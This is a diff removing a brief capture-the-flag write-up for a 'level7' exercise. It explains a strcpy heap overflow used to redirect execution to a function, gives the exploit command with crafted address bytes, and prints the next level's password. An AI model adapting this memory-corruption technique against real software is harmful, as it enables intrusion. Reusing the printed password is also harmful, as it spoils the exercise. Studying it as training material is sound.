@@ -1,8 +1,0 @@
-Here addr of str2[1] is write after the memory of str[1] (view source)
-We can overwrite this addr with strcpy(str[1], av[1]) for began
-the return addr of the main and change it with strcpy(str[2], av[2]) to began the addr of m fonction
-
-./level7 `echo -e "\x0c\xf7\xff\xbf\x0c\xf7\xff\xbf\x0c\xf7\xff\xbf\x0c\xf7\xff\xbf\x0c\xf7\xff\xbf\x0c\xf7\xff\xbf\x0c\xf7\xff\xbf\x0c\xf7\xff\xbf\x0c\xf7\xff\xbf\x0c\xf7\xff\xbf\x0c\xf7\xff\xbf\x0c\xf7\xff\xbf"` `echo -e "\xf4\x84\x04\x08"`
-
-password lvl8 : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
-
